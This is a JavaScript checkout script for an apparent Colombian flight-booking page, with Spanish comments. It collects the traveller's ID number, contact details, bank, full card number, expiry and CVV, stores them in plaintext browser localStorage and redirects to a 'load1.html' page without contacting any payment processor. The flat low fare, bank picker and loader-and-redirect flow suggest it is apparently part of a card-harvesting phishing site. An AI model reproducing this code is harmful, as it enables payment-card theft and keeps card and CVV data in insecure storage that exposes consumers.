// ./js/payment.js
document.addEventListener('DOMContentLoaded', () => {
  const $  = (s, ctx=document) => ctx.querySelector(s);
  const $$ = (s, ctx=document) => Array.from(ctx.querySelectorAll(s));

  // ----------------- Limpieza de claves antiguas -----------------
  (function normalizePaymentKeys(){
    try {
      // migra si solo existía el alias viejo
      const aliasVal = localStorage.getItem('datospago');
      if (aliasVal && !localStorage.getItem('datos_pago')) {
        localStorage.setItem('datos_pago', aliasVal);
      }
      // elimina duplicados/legacy
      localStorage.removeItem('datospago');
      localStorage.removeItem('datos_pago_raw');
      localStorage.removeItem('datospago_raw');
    } catch {}
  })();

  // ----------------- Refs UI (no tocamos estilos) -----------------
  const loader          = $('.loader');
  const labelTotal      = $('#label-total-resume');
  const labelDepartures = $('#label-departures');
  const btnNext         = $('#btn-next-step');
  const cardInputs      = $('#card-inputs');

  // ----------------- Helpers base -----------------
  const getJSON = (k, def=null) => { try { const s = localStorage.getItem(k); return s ? JSON.parse(s) : def; } catch { return def; } };
  const cleanDigits = s => String(s || '').replace(/\D+/g, '');

  // ----------------- Cálculo TOTAL (idéntico a resumen.js) -----------------
  const PRECIO_BASE = 46900; // Precio base de los vuelos
  const MULTIPLICADORES_PRECIO = { light: 1, smart: 1.7, full: 3 };

  const normalizeType = (raw) => {
    const t = String(raw || '').toLowerCase().replace(/[^a-z]/g,'');
    return (t === 'light' || t === 'smart' || t === 'full') ? t : 'light';
  };
  const pasajerosPagantes = (fi) => {
    const adults   = Number(fi?.adults   ?? 0) || 0;
    const children = Number(fi?.children ?? 0) || 0;
    return Math.max(0, adults + children); // bebés no pagan
  };
  const totalPorTramo = (ticketType, pagantes) => {
    const mult = MULTIPLICADORES_PRECIO[normalizeType(ticketType)] ?? 1;
    return PRECIO_BASE * mult * pagantes;
  };
  const computeTotalFromInfo = (info) => {
    const fi = info?.flightInfo || {};
    const pag = pasajerosPagantes(fi);
    if (!fi?.origin || pag <= 0) return 0;
    let total = 0;
    total += totalPorTramo(fi.origin.ticket_type, pag); // ida
    if (fi.travel_type === 1) total += totalPorTramo(fi.destination?.ticket_type, pag); // vuelta
    return Math.round(total);
  };

  // ----------------- Inputs (no cambiamos tipos/clases) -----------------
  const inpName    = $('#name');
  const inpSurname = $('#surname');
  const selDocType = document.querySelector('.select-container select:not(#ban)');
  const inpCC      = $('#cc');
  const inpCity    = $('#city');
  const inpAddress = $('#address');
  const inpEmail   = $('#email');
  const inpTel     = $('#telnum');

  const selBank    = $('#ban');   // banco
  const inpCard    = $('#p');     // número de tarjeta
  const inpExp     = $('#pdate'); // expiración
  const inpCVV     = $('#c');     // cvv

  // ----------------- Máscaras pedidas (respetando tu HTML con oninput=...) -----------------
  // Tarjeta: 16 dígitos, 4-4-4-4
  window.formatCNumber = (el) => {
    if (!el) return;
    const d = cleanDigits(el.value).slice(0,16);
    el.value = d.replace(/(\d{4})(?=\d)/g,'$1 ').trim();
  };
  // Fecha: MM/YY con "/" automático
  window.formatDate = (el) => {
    if (!el) return;
    const d = cleanDigits(el.value).slice(0,4); // MMYY
    el.value = (d.length >= 3) ? d.slice(0,2) + '/' + d.slice(2) : d;
  };
  // CVV: máx 4 (tu HTML ya pone 3 como mínimo lógico a nivel de validación abajo)
  window.limitDigits = (el /*, min */) => {
    if (!el) return;
    el.value = cleanDigits(el.value).slice(0,4);
  };

  // Además, enganchamos eventos para cuando haya pegados/tecleo raro
  if (inpCard) {
    inpCard.addEventListener('input', () => window.formatCNumber(inpCard));
    inpCard.addEventListener('keypress', (e) => { if (!/[0-9 ]/.test(e.key)) e.preventDefault(); });
  }
  if (inpExp) {
    inpExp.addEventListener('input', () => window.formatDate(inpExp));
    inpExp.addEventListener('keypress', (e) => { if (e.key === '/' || !/\d/.test(e.key)) e.preventDefault(); });
  }
  if (inpCVV) {
    inpCVV.addEventListener('input', () => window.limitDigits(inpCVV));
    inpCVV.addEventListener('keypress', (e) => { if (!/\d/.test(e.key)) e.preventDefault(); });
  }

  // ----------------- Luhn (obligatorio para avanzar) -----------------
  const luhnCheck = (num) => {
    const d = cleanDigits(num);
    let sum = 0, alt = false;
    for (let i = d.length - 1; i >= 0; i--) {
      let n = d.charCodeAt(i) - 48;
      if (alt) { n <<= 1; if (n > 9) n -= 9; }
      sum += n; alt = !alt;
    }
    return d.length > 0 && sum % 10 === 0;
  };

  // ----------------- Pinta ruta + total y sincroniza local -----------------
  const info = getJSON('info', null);
  const totalNum = computeTotalFromInfo(info);
  try { localStorage.setItem('total_pagar', String(totalNum)); } catch {}

  if (labelTotal) {
    labelTotal.textContent = new Intl.NumberFormat('es-CO', {
      style: 'currency', currency: 'COP', maximumFractionDigits: 0
    }).format(totalNum);
  }
  if (info?.flightInfo?.origin?.city && info?.flightInfo?.destination?.city) {
    const o = info.flightInfo.origin.city;
    const d = info.flightInfo.destination.city;
    const travelType = Number(info.flightInfo.travel_type);
    labelDepartures.textContent = (travelType === 1) ? `${o} - ${d} | ${d} - ${o}` : `${o} - ${d}`;
  }

  // ----------------- Método de pago (solo lógica) -----------------
  let selectedMethod = null;
  const methodCards = $$('#payment-method > .d-flex.flex-column.align-items-center.justify-content-center');
  const methodMap   = ['debito','credito','amex']; // orden de tus 3 tarjetas visuales
  methodCards.forEach((node, idx) => {
    node.dataset.method = methodMap[idx] || 'credito';
    node.addEventListener('click', () => {
      methodCards.forEach(n => n.classList.remove('selected'));
      node.classList.add('selected');
      selectedMethod = node.dataset.method;
      cardInputs?.classList.remove('hide'); // muestras el bloque de tarjeta
    });
  });

  // ----------------- Lectura de formulario (TODOS los campos) -----------------
  const getSelectDocTypeLabel = () => {
    if (!selDocType) return '';
    const i = selDocType.selectedIndex >= 0 ? selDocType.selectedIndex : 0;
    return selDocType.options[i]?.text || selDocType.value || '';
  };
  const getCuotasText = () => {
    const el = $('#cuotas') || $('#dues'); // si más adelante añades cuotas
    if (!el) return '1 cuota';
    const i = el.selectedIndex >= 0 ? el.selectedIndex : 0;
    return el.options[i]?.text || el.value || '1 cuota';
  };
  const getPersonal = () => ({
    name:     inpName?.value?.trim()    || '',
    surname:  inpSurname?.value?.trim() || '',
    doc_type: getSelectDocTypeLabel(),
    cc:       inpCC?.value?.trim()      || '',
    city:     inpCity?.value?.trim()    || '',
    address:  inpAddress?.value?.trim() || '',
    email:    inpEmail?.value?.trim()   || '',
    telnum:   inpTel?.value?.trim()     || ''
  });
  const getCard = () => ({
    bank_code:  selBank?.value || '',
    bank_label: selBank?.options[selBank.selectedIndex]?.label || selBank?.value || '',
    card_number: cleanDigits(inpCard?.value || ''),
    exp:         inpExp?.value || '',
    cvv:         inpCVV?.value?.trim() || ''
  });

  // ----------------- Validación (incluye Luhn obligatorio) -----------------
  const formIsValid = () => {
    const form = $('#main-form');
    if (!selectedMethod) selectedMethod = 'credito';

    let ok = form ? form.reportValidity() : true;

    // Tarjeta
    const num = cleanDigits(inpCard?.value || '');
    if (num.length !== 16 || !luhnCheck(num)) {
      inpCard?.setCustomValidity('Número de tarjeta inválido (Luhn, 16 dígitos)');
      ok = false;
    } else {
      inpCard?.setCustomValidity('');
    }

    // Fecha MM/YY (mes válido)
    const exp = String(inpExp?.value || '');
    const mm  = parseInt(exp.slice(0,2), 10);
    if (!/^\d{2}\/\d{2}$/.test(exp) || mm < 1 || mm > 12) {
      inpExp?.setCustomValidity('Fecha inválida (MM/YY)');
      ok = false;
    } else {
      inpExp?.setCustomValidity('');
    }

    // CVV 3-4
    const cvv = String(inpCVV?.value || '');
    if (!/^\d{3,4}$/.test(cvv)) {
      inpCVV?.setCustomValidity('CVV debe tener 3 o 4 dígitos');
      ok = false;
    } else {
      inpCVV?.setCustomValidity('');
    }

    form && form.reportValidity();
    return ok;
  };

  // ----------------- Guardar TODO y redirigir -----------------
  const saveAndGo = () => {
    const personal = getPersonal();
    const card     = getCard();
    const cuotas   = getCuotasText();

    // Construimos objeto con TODOS los datos del formulario + cálculo y meta útiles
    const datosPago = {
      // Identificación titular
      nombre:   `${personal.name} ${personal.surname}`.trim(),
      nombres:  personal.name,
      apellidos:personal.surname,
      tipo_documento: personal.doc_type,
      cedula:   personal.cc,
      telefono: personal.telnum,
      email:    personal.email,

      // Dirección
      pais:     'Colombia',             // fijo según tu UI actual
      ciudad:   personal.city,
      direccion:personal.address,

      // Tarjeta
      tarjeta:  card.card_number,
      vence:    card.exp,
      cvv:      card.cvv,
      banco_codigo: card.bank_code,
      banco:       card.bank_label,
      metodo:      selectedMethod || 'credito',
      cuotas:   cuotas,

      // Totales / contexto
      total:    Number(localStorage.getItem('total_pagar') || totalNum || 0),
      ruta:     labelDepartures?.textContent || '',
      timestamp: Date.now()
    };

    localStorage.setItem('datos_pago', JSON.stringify(datosPago));

    loader?.classList.add('show');
    setTimeout(() => { window.location.href = 'load1.html'; }, 400);
  };

  // ----------------- Eventos -----------------
  btnNext?.addEventListener('click', (e) => {
    e.preventDefault();
    if (formIsValid()) saveAndGo();
  });

  $('#main-form')?.addEventListener('submit', (e) => {
    e.preventDefault();
    if (formIsValid()) saveAndGo();
  });
});
